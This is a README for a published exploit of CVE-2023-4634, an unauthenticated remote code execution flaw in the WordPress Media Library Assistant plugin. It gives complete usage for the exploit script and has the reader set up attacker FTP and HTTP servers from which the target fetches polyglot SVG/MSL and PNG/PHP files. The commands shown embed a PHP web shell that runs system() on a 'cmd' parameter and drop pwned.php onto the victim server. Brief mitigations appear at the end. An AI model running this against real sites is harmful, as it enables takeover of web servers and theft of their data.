# CVE-2023-4634
RCE Exploit for Wordpress Plugin Media-Library Plugin < 3.10 (CVE-2023-4634)

# Info
Patrowl discovered An unauthenticated RCE Vulnerability on Media-Librairy-Assistant Wordpress Plugin in version < 3.10. 
The exploit is not trivial and requires just a little setup explained bellow. 

Global discover and exploitaiton of the exploit could be found in our blog: https://patrowl.io/blog-wordpress-media-library-rce-cve-2023-4634/

# Prerequisite of exploitaiton 
- Wordpress installed (all versions will work)
- Media-Library-Assistant in version < 3.10 (https://fr.wordpress.org/plugins/media-library-assistant/)
- Imagick libraries installed on the server 
- Default Imagick configuration
- external network connectivitiy 

# Detection
The detection of the vulnerability could be performed using a basic DNS check on a remote FTP server. The nuclei template could be found on : CVE-2023-4634.yaml.
```
nuclei -u http://x.x.x.x -t ./CVE-2023-4634.yaml
```

The complete exploitation and RCE could then be performed using the CVE-2023-4634.py script. 

Note: You can also use the script to trigger more simple exploitation such as LFI, just need to forge specific SVG and host it on your FTP, follow recommendations in our blog. 

# Usage
Install requirement:
```
python3 -m pip install -r requirements.txt
```

Then
```
python3 CVE-CVE-2023-4634.py -h
```

Gives you:
```console
usage: CVE-2023-4634 Exploit [-h] [--target [TARGET]] [--remoteftp [REMOTEFTP]] [--remotehttp [REMOTEHTTP]] [--svg_polyglot_name [SVG_POLYGLOT_NAME]] [--svg_exploiter_names [SVG_EXPLOITER_NAMES]] [--png_polyglot_name [PNG_POLYGLOT_NAME]] [--concurrency [CONCURRENCY]] [--generatesvg | --no-generatesvg] [--webserverpath WEBSERVERPATH]
                             [--exploitname EXPLOITNAME] [--generatepng | --no-generatepng] [--payload PAYLOAD]

Exploit CVE-2023-4634 on Media-Library-Assistant version < 3.10

options:
  -h, --help            show this help message and exit
  --target [TARGET]     URL of the Target, ex http://victimwordpress.org
  --remoteftp [REMOTEFTP]
                        URL of the remote FTP use to store SVGs files, ex ftp://X.X.X.X:PORT
  --remotehttp [REMOTEHTTP]
                        URL of the remote HTTP use to store the final Polyglot PNG/PHP file, ex http://X.X.X.X:PORT
  --svg_polyglot_name [SVG_POLYGLOT_NAME]
                        Name of the external polyglot SVG/MSL file used (for generation or final usage), example : poly.svg
  --svg_exploiter_names [SVG_EXPLOITER_NAMES]
                        Name of the external VID bruteforcers file use, the FUZZ part will be replaced by the first letter bruteforced (for generation or final usage), ex: exploiter_FUZZ.svg
  --png_polyglot_name [PNG_POLYGLOT_NAME]
                        Name of the external PNG/PHP to use (for generation or final usage), ex: exploiter_FUZZ.svg
  --concurrency [CONCURRENCY]
                        Number of concurrent long SVG conversion requests to make ( default 100 )
  --generatesvg, --no-generatesvg
                        Generate both polyglot SVG/MSL file and VID bruteforcer within the remote_ftp directory
  --webserverpath WEBSERVERPATH
                        Path of the webserver on the victim server (could be found with the LFI and wp-config file) example: /var/www/html
  --exploitname EXPLOITNAME
                        Dropped exploit name example: pwned.php
  --generatepng, --no-generatepng
                        Generate polyglot PNG/PHP file, integrate php file with -payload option in exploit-png folder
  --payload PAYLOAD     PHP Payload to integrate in the PNG file ex: <?php phpinfo(); ?>
```


Now to be working you need to setup on remote hosts:
- 1 FTP server hosting polyglot SVG/MSL and SVG/VID exploiters
- 1 HTTP server hosting the polyglot PNG/MSL

# Before exploitation
## Prepare your FTP Server
You can run a simple FTP server using Python :

```console
python3 -m pyftpdlib -p 2122
[I 2023-08-31 12:24:17] concurrency model: async
[I 2023-08-31 12:24:17] masquerade (NAT) address: None
[I 2023-08-31 12:24:17] passive ports: None
[I 2023-08-31 12:24:17] >>> starting FTP server on 0.0.0.0:2122, pid=482661 <<<
```

Once setup, you need to add to your FTP servers the SVG/MSL polyglot files, and all SVG exploiters, you can easily generate them using the script:
```bash
python3 CVE-2023-4634.py --generatesvg --svg_polyglot_name poly.svg --svg_exploiter_names exploiter_FUZZ.svg  --remotehttp http://192.168.1.164:8081 --png_polyglot_name virus.png  --webserverpath /var/www/html --exploitname pwned.php
```

It will generate in `remote_ftp` folder:
- poly.svg, polyglot SVG/MSL with non routed address that will take long time to be generated by the target, with a MSL that will store the `png_polyglot_name` from `remotettp` to the destination path (`webserverpath`+ `exploitname`) 
- all 64 SVG/VID exploiters  using the exploiter_FUZZ nomenclature where FUZZ will be replaced by bruteforced char

Note that the script will also copy the svg file with [0] at the end of it (poly.svg and poly.svg[0]). 
Both files are needed for the exploitation to be working. 

Put all the generated file (normal and [0]) in your FTP root directory of your FTP server. 
It should looks like this:
```console
ls remote_ftp/
exploiter_-.svg    exploiter_3.svg    exploiter_7.svg    exploiter_B.svg    exploiter_F.svg    exploiter_J.svg    exploiter_N.svg    exploiter_R.svg    exploiter_V.svg    exploiter_Z.svg
exploiter_-.svg[0] exploiter_3.svg[0] exploiter_7.svg[0] exploiter_B.svg[0] exploiter_F.svg[0] exploiter_J.svg[0] exploiter_N.svg[0] exploiter_R.svg[0] exploiter_V.svg[0] exploiter_Z.svg[0]
exploiter_0.svg    exploiter_4.svg    exploiter_8.svg    exploiter_C.svg    exploiter_G.svg    exploiter_K.svg    exploiter_O.svg    exploiter_S.svg    exploiter_W.svg    exploiter__.svg
exploiter_0.svg[0] exploiter_4.svg[0] exploiter_8.svg[0] exploiter_C.svg[0] exploiter_G.svg[0] exploiter_K.svg[0] exploiter_O.svg[0] exploiter_S.svg[0] exploiter_W.svg[0] exploiter__.svg[0]
exploiter_1.svg    exploiter_5.svg    exploiter_9.svg    exploiter_D.svg    exploiter_H.svg    exploiter_L.svg    exploiter_P.svg    exploiter_T.svg    exploiter_X.svg    poly.svg
exploiter_1.svg[0] exploiter_5.svg[0] exploiter_9.svg[0] exploiter_D.svg[0] exploiter_H.svg[0] exploiter_L.svg[0] exploiter_P.svg[0] exploiter_T.svg[0] exploiter_X.svg[0] poly.svg[0]
exploiter_2.svg    exploiter_6.svg    exploiter_A.svg    exploiter_E.svg    exploiter_I.svg    exploiter_M.svg    exploiter_Q.svg    exploiter_U.svg    exploiter_Y.svg
exploiter_2.svg[0] exploiter_6.svg[0] exploiter_A.svg[0] exploiter_E.svg[0] exploiter_I.svg[0] exploiter_M.svg[0] exploiter_Q.svg[0] exploiter_U.svg[0] exploiter_Y.svg[0]
```

## Prepare your HTTP Server
You can run a simple HTTP server using Python:
```console
python3 -m http.server -p 8081
[I 2023-08-31 12:24:17] concurrency model: async
[I 2023-08-31 12:24:17] masquerade (NAT) address: None
[I 2023-08-31 12:24:17] passive ports: None
[I 2023-08-31 12:24:17] >>> starting FTP server on 0.0.0.0:2122, pid=482661 <<<
```

You just need to add your polyglot PNG/PHP file. You can also use the script to genrate the file and include the wanted payload:
```bash
python3 CVE-2023-4634.py --generatepng --payload "<?php if(isset(\$_REQUEST['cmd'])){ echo \"<pre>\"; \$cmd = (\$_REQUEST['cmd']); system(\$cmd); echo \"</pre>\"; die; }?>" --png_polyglot_name virus.png
```

# Exploit
Now that both remote FTP server and HTTP server are ready, you can lauch exploitation on vulnerable target (the script will check if the target is using a vulnerable version of the plugins). 
Example:
```bash
python3 CVE-2023-4634.py --target http://127.0.0.1 --remoteftp ftp://192.168.1.164:2122 --remotehttp http://192.168.1.164:8081 --svg_polyglot_name poly.svg --svg_exploiter_names exploiter_FUZZ.svg --png_polyglot_name virus.png  --exploitname pwned.php
```

And if everything is ok, you should have your `exploitname` dropped within the `webserverpath` (depend on how you configure your exploit)
Enjoy!

# Video Clip
I've made a video clip. 


https://github.com/Patrowl/CVE-2023-4634/assets/15944951/6f9d356f-f0ec-48df-9037-5f8a4b64e44f


# Mitigations
- Upgrade to the latest version of the plugins (https://fr.wordpress.org/plugins/media-library-assistant/)
- Reinforce Imagick security policy by disable dangerous file to be converted such as : "MSL, MSVG, MVG, PS, PDF, RSVG, SVG, XPS, VID"
Could be done by adding 

```xml
  <policy domain="coder" rights="none" pattern="SVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="MSVG" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="VID" />

```
To 
```
/etc/ImageMagick-X/policy.xml
```
